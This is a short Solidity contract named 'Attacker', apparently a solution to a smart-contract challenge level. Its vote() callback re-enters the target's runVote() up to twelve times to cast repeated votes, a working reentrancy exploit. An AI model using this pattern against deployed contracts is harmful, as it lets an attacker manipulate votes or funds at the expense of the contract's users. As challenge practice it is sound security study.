// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Level {
    function runVote() external;
}

contract Attacker {
    uint cnt = 0;
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function vote() public returns (uint) {
        uint val = 1;

        if(cnt < 12)
        {
            cnt += 1;
            Level(target).runVote();
        }

        return val;
    }
}
